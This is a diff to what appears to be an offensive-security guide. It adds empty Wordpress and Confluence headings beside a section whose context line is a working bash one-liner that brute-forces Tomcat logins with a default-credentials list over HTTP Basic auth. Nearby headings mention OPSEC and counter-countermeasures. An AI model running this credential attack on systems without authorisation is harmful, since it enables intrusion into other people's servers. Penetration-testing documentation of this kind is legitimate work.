@@ -127,6 +127,10 @@ Launch:
 while read line; do echo -n "$line : "; for i in $(cat PAYLOADS/tomcat-defaults-1.txt); do RES=$(curl -k -H "Authorization: Basic $(echo -n "$i" | base64)" -s -o /dev/null -w "%{http_code}" --url "$line"); echo "$i:: $RES"; [ "$RES" -eq 200 ] && break; done; done < tomcat-urls.txt | tee tomcats-results-1.txt
 ```
 
+### Wordpress
+
+### Atlassian Confluence
+
 ## OPSEC considerations
 
 ## Counter-countermeasures
